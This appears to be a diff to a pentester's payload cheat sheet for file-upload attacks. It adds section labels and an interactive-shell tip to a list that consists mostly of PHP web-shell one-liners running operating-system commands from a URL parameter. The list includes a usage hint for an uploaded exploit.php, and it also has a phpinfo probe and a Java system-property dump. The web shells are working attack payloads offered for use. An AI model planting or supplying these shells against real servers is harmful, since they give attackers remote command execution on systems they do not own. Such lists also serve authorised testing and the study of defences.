@@ -1,9 +1,11 @@
+For PHP based application:
 <?php echo system($_GET['command']); ?>				if it is uploaded try to access "/example/exploit.php?command=id"
 <?php phpinfo(); ?>
 <?php echo system('id'); ?>
 <?php echo shell_exec($_GET[‘e’].’ 2>&1'); ?>
 
 
+For Java Based Application:
 java 
 public class JavaInfo {
     public static void main(String[] args) {
@@ -20,3 +22,5 @@ public class JavaInfo {
         System.out.println("Java VM Vendor: " + System.getProperty("java.vm.vendor"));
     }
 }
+
+Once you get the RCE you can try for intractive shell using: Laudanum shell
